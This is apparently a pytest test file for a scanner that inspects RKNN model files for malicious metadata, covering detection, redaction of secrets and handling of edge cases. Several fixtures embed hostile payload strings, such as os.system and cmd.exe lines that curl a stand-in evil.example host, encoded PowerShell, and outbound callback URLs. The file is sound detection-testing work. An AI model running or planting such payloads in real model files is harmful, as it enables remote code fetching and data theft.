"""Tests for RKNN scanner support."""

from __future__ import annotations

from pathlib import Path

import pytest

from modelaudit import core
from modelaudit.cache import get_cache_manager, reset_cache_manager
from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
from modelaudit.scanners.rknn_scanner import RknnScanner
from modelaudit.utils.file.detection import detect_file_format


def _write_rknn_file(tmp_path: Path, payload: bytes, filename: str = "model.rknn") -> Path:
    path = tmp_path / filename
    path.write_bytes(payload)
    return path


def test_can_handle_valid_rknn_file(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=resnet50\nruntime=rockchip\ninput=224x224\n"
    path = _write_rknn_file(tmp_path, payload)

    assert RknnScanner.can_handle(str(path))


def test_can_handle_rejects_non_rknn_content(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"not-rknn-binary-content", filename="fake.rknn")

    assert not RknnScanner.can_handle(str(path))


def test_scan_benign_rknn_no_critical_findings(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"model_name=resnet50\n"
        b"model_version=1.0\n"
        b"runtime=rockchip\n"
        b"target=rk3588\n"
        b"quantization=int8\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="safe.rknn")

    result = RknnScanner().scan(str(path))

    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_scan_safe_metadata_key_dangerous_value_is_not_skipped(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00description=os.system('curl https://evil.example/payload')\nruntime=rockchip\n"
    path = _write_rknn_file(tmp_path, payload, filename="safe-key-dangerous-value.rknn")

    result = RknnScanner().scan(str(path))

    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    path_references = [
        check
        for check in result.checks
        if check.name == "RKNN Path Reference Validation" and check.status == CheckStatus.FAILED
    ]
    assert len(correlated) == 1
    assert correlated[0].severity == IssueSeverity.CRITICAL
    assert "curl https://evil.example/payload" in repr(correlated[0].details)
    assert len(path_references) == 1


def test_scan_safe_metadata_key_benign_value_stays_clean(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00description=network ready model for offline execution benchmarks\nruntime=rockchip\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="safe-key-benign-value.rknn")

    result = RknnScanner().scan(str(path))

    assert not [
        check
        for check in result.checks
        if check.name
        in {
            "RKNN Path Reference Validation",
            "RKNN Command Indicator Detection",
            "RKNN Command and Network Indicator Correlation",
        }
        and check.status == CheckStatus.FAILED
    ]


def test_scan_unsafe_metadata_key_dangerous_value_remains_detected(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00notes=os.system('curl https://evil.example/payload')\n"
    path = _write_rknn_file(tmp_path, payload, filename="unsafe-key-dangerous-value.rknn")

    result = RknnScanner().scan(str(path))

    assert any(
        check.name == "RKNN Command and Network Indicator Correlation"
        and check.status == CheckStatus.FAILED
        and check.severity == IssueSeverity.CRITICAL
        for check in result.checks
    )


def test_scan_detects_correlated_command_and_network_indicators(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="malicious.rknn")

    result = RknnScanner().scan(str(path))

    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    assert len(correlated) == 1
    assert correlated[0].severity == IssueSeverity.CRITICAL


def test_rknn_redacts_sensitive_evidence_in_findings(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"callback=https://user:secretpass@evil.example/collect?access_token=tok_12345\n"
        b'notes=cmd.exe /c curl -H "Authorization: Bearer sk-testsecret1234567890" '
        b"https://evil.example/payload?api_key=key_12345\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="redacted.rknn")

    result = RknnScanner().scan(str(path))

    path_reference = [
        check
        for check in result.checks
        if check.name == "RKNN Path Reference Validation" and check.status == CheckStatus.FAILED
    ]
    correlated = [
        check
        for check in result.checks
        if check.name == "RKNN Command and Network Indicator Correlation" and check.status == CheckStatus.FAILED
    ]
    assert len(path_reference) == 1
    assert len(correlated) == 1

    details = repr(path_reference[0].details) + repr(correlated[0].details)
    assert "secretpass" not in details
    assert "tok_12345" not in details
    assert "sk-testsecret" not in details
    assert "key_12345" not in details
    assert "evil.example" in details
    assert "curl" in details
    assert "<redacted>" in details


def test_scan_handles_truncated_rknn_gracefully(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN", filename="truncated.rknn")

    result = RknnScanner().scan(str(path))
    structural_failures = [check for check in result.checks if check.name == "RKNN Structural Integrity"]
    assert len(structural_failures) == 1
    assert structural_failures[0].status == CheckStatus.FAILED
    assert result.success is False


def test_scan_bounded_rknn_window_is_inconclusive(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=resnet50\nruntime=rockchip\n" + (b"safe\n" * 40)
    path = _write_rknn_file(tmp_path, payload, filename="bounded.rknn")

    result = RknnScanner(config={"rknn_max_scan_bytes": 32}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "rknn_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]


def test_scan_read_failure_is_inconclusive_not_security_finding(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00model_name=demo runtime=rockchip")

    def raise_os_error(*_args: object, **_kwargs: object) -> None:
        raise OSError("simulated RKNN read failure")

    monkeypatch.setattr(RknnScanner, "can_handle", classmethod(lambda _cls, _path: True))
    monkeypatch.setattr("modelaudit.scanners.rknn_scanner.open", raise_os_error, raising=False)

    direct = RknnScanner().scan(str(path))
    read_checks = [check for check in direct.checks if check.name == "RKNN File Read"]
    assert len(read_checks) == 1
    assert read_checks[0].severity == IssueSeverity.INFO
    assert read_checks[0].details["analysis_incomplete"] is True
    assert read_checks[0].details["scan_outcome_reason"] == "rknn_read_failed"
    assert direct.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "rknn_read_failed" in direct.metadata["scan_outcome_reasons"]

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(path)]
            assert "rknn_read_failed" in metadata["scan_outcome_reasons"]
            assert not [
                issue for issue in aggregate.issues if issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
            ]
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_string_extraction_limit_marks_late_rknn_payload_inconclusive(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"model_name=safe\x00runtime=rockchip\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload callback=https://evil.example/collect\x00"
    )
    path = _write_rknn_file(tmp_path, payload, filename="late-payload.rknn")

    result = RknnScanner(config={"rknn_max_extracted_strings": 2}).scan(str(path))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "rknn_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
    budget_checks = [check for check in result.checks if check.name == "RKNN Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.FAILED
    assert "stopped at the configured extraction limit" in budget_checks[0].message
    assert budget_checks[0].details["analysis_incomplete"] is True

    cache_dir = tmp_path / "cache"
    reset_cache_manager()
    try:
        first = core.scan_model_directory_or_file(
            str(path),
            rknn_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = core.scan_model_directory_or_file(
            str(path),
            rknn_max_extracted_strings=2,
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert core.determine_exit_code(aggregate) == 2
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_string_extraction_exact_limit_preserves_clean_rknn_result(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00model_name=safe\x00runtime=rockchip\x00"
    path = _write_rknn_file(tmp_path, payload, filename="exact-limit.rknn")

    result = RknnScanner(config={"rknn_max_extracted_strings": 2}).scan(str(path))

    assert result.success is True
    assert "scan_outcome" not in result.metadata
    budget_checks = [check for check in result.checks if check.name == "RKNN Text Fragment Budget"]
    assert len(budget_checks) == 1
    assert budget_checks[0].status == CheckStatus.PASSED
    assert budget_checks[0].details["analysis_incomplete"] is False


def test_regression_rknn_routes_to_dedicated_scanner(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00model_name=demo\nruntime=rockchip\n")

    result = core.scan_file(str(path))
    assert result.scanner_name == "rknn"
    assert result.scanner_name != "unknown"


def test_renamed_rknn_routes_and_detects_correlated_indicators(tmp_path: Path) -> None:
    payload = (
        b"RKNN\x01\x00\x00\x00"
        b"notes=cmd.exe /c curl https://evil.example/payload\n"
        b"callback=http://198.51.100.5:8080/collect\n"
    )
    path = _write_rknn_file(tmp_path, payload, filename="payload.jpg")

    assert RknnScanner.can_handle(str(path))
    assert detect_file_format(str(path)) == "rknn"

    direct = core.scan_file(str(path))
    assert direct.scanner_name == "rknn"
    assert any(check.severity == IssueSeverity.CRITICAL for check in direct.checks)

    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
    assert directory.files_scanned == 1
    assert "rknn" in directory.scanner_names


def test_renamed_rknn_near_match_remains_skipped(tmp_path: Path) -> None:
    path = _write_rknn_file(tmp_path, b"RKNX\x01\x00\x00\x00model_name=demo\n", filename="notes.jpg")

    assert not RknnScanner.can_handle(str(path))
    assert detect_file_format(str(path)) == "unknown"

    directory = core.scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
    assert directory.files_scanned == 0


def test_false_positive_high_entropy_blob_is_not_critical(tmp_path: Path) -> None:
    high_entropy_like = b"A" * 220 + b"\nmetadata=benchmark\n"
    path = _write_rknn_file(tmp_path, b"RKNN\x01\x00\x00\x00" + high_entropy_like, filename="entropy.rknn")

    result = RknnScanner().scan(str(path))
    critical_checks = [check for check in result.checks if check.severity == IssueSeverity.CRITICAL]
    assert len(critical_checks) == 0


def test_false_positive_common_labels_do_not_trigger_command_alert(tmp_path: Path) -> None:
    payload = b"RKNN\x01\x00\x00\x00label=execute_mode_fast\ndescription=network_ready_model\nruntime=rockchip\n"
    path = _write_rknn_file(tmp_path, payload, filename="labels.rknn")

    result = RknnScanner().scan(str(path))
    command_failures = [
        check
        for check in result.checks
        if check.name in {"RKNN Command Indicator Detection", "RKNN Command and Network Indicator Correlation"}
        and check.status == CheckStatus.FAILED
    ]
    assert len(command_failures) == 0
